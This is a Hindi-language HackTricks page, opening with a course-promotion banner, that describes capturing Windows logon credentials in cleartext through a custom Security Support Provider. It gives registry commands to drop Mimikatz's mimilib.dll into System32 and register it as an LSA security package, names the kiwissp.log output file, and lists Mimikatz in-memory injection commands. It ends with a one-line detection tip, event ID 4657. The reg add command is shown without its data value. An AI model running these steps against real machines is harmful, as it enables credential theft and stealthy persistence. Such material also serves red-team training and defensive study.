# Custom SSP

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* पर फॉलो\*\* करें।
* **हैकिंग ट्रिक्स साझा करें और PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

### कस्टम SSP

[यहाँ जानें कि SSP (सुरक्षा समर्थन प्रदाता) क्या है।](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
आप अपना **खुद का SSP** बना सकते हैं ताकि मशीन तक पहुंचने के लिए उपयोग किए गए **क्रेडेंशियल्स** को **स्पष्ट पाठ** में **कैप्चर** कर सकें।

#### Mimilib

आप Mimikatz द्वारा प्रदान किए गए `mimilib.dll` बाइनरी का उपयोग कर सकते हैं। **यह सभी क्रेडेंशियल्स को स्पष्ट पाठ में एक फ़ाइल में लॉग करेगा।**\
`C:\Windows\System32\` में dll ड्रॉप करें\
मौजूदा LSA सुरक्षा पैकेज की सूची प्राप्त करें:

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

सुरक्षा समर्थन प्रदाता सूची (सुरक्षा पैकेज) में `mimilib.dll` जोड़ें:

```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```

और एक बार पुनरारंभ के बाद सभी प्रमाण पाठ में स्पष्ट पाठ में `C:\Windows\System32\kiwissp.log` में पाए जा सकते हैं।

#### मेमोरी में

आप इसे मेमोरी में सीधे Mimikatz का उपयोग करके भी इंजेक्ट कर सकते हैं (ध्यान दें कि यह थोड़ा अस्थिर/काम नहीं कर सकता है):

```powershell
privilege::debug
misc::memssp
```

#### निवारण

घटना आईडी 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` के निर्माण/परिवर्तन की ऑडिट।
